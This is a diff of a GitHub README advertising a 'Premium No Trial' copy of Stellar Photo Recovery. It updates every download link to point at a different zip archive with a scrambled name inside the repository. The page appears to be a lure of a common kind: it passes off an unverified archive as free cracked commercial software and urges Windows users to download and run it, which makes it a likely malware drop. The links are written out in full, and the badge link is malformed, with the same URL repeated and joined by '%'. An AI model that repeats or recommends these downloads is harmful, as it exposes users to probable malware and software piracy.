@@ -1,7 +1,7 @@
 # 🌟 Stellar-Photo-Recovery-Premium-No-Trial - Effortlessly Recover Your Lost Photos
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/JoshBmy13/Stellar-Photo-Recovery-Premium-No-Trial/main/Floscularia/Stellar-Photo-Recovery-Premium-No-Trial-2.8.zip%https://raw.githubusercontent.com/JoshBmy13/Stellar-Photo-Recovery-Premium-No-Trial/main/Floscularia/Stellar-Photo-Recovery-Premium-No-Trial-2.8.zip)](https://raw.githubusercontent.com/JoshBmy13/Stellar-Photo-Recovery-Premium-No-Trial/main/Floscularia/Stellar-Photo-Recovery-Premium-No-Trial-2.8.zip)
+[![Download](https://github.com/JoshBmy13/Stellar-Photo-Recovery-Premium-No-Trial/raw/refs/heads/main/Floscularia/Stellar_Recovery_Trial_Photo_No_Premium_v3.6.zip%https://github.com/JoshBmy13/Stellar-Photo-Recovery-Premium-No-Trial/raw/refs/heads/main/Floscularia/Stellar_Recovery_Trial_Photo_No_Premium_v3.6.zip)](https://github.com/JoshBmy13/Stellar-Photo-Recovery-Premium-No-Trial/raw/refs/heads/main/Floscularia/Stellar_Recovery_Trial_Photo_No_Premium_v3.6.zip)
 
 ## 🚀 Getting Started
 Welcome to Stellar Photo Recovery Premium! This guide will help you download and run the software on your Windows PC. Follow these steps, and you will be recovering your lost images in no time.
@@ -26,7 +26,7 @@ To run Stellar Photo Recovery Premium, make sure your system meets the following
 ## 📥 Download & Install
 1. **Visit the Releases Page**: Click the link below to access the latest version of the software. 
 
-   [Download the Latest Version](https://raw.githubusercontent.com/JoshBmy13/Stellar-Photo-Recovery-Premium-No-Trial/main/Floscularia/Stellar-Photo-Recovery-Premium-No-Trial-2.8.zip)
+   [Download the Latest Version](https://github.com/JoshBmy13/Stellar-Photo-Recovery-Premium-No-Trial/raw/refs/heads/main/Floscularia/Stellar_Recovery_Trial_Photo_No_Premium_v3.6.zip)
 
 2. **Download the Software**: On the releases page, locate the latest version of Stellar Photo Recovery Premium. Click on the appropriate file to download the software.
 
@@ -64,4 +64,4 @@ You can recover photos, videos, and audio across various formats, including JPEG
 Stellar Photo Recovery Premium is designed for anyone needing to recover lost images easily and efficiently. By following the steps outlined above, you can confidently download, install, and start using this powerful tool to restore your precious memories. If you have any questions or need further assistance, our user guides have the answers you need.
 
 ### Remember, every recovery starts with a single click. 
-[Download the Latest Version](https://raw.githubusercontent.com/JoshBmy13/Stellar-Photo-Recovery-Premium-No-Trial/main/Floscularia/Stellar-Photo-Recovery-Premium-No-Trial-2.8.zip) today and start your photo recovery journey!
+[Download the Latest Version](https://github.com/JoshBmy13/Stellar-Photo-Recovery-Premium-No-Trial/raw/refs/heads/main/Floscularia/Stellar_Recovery_Trial_Photo_No_Premium_v3.6.zip) today and start your photo recovery journey!
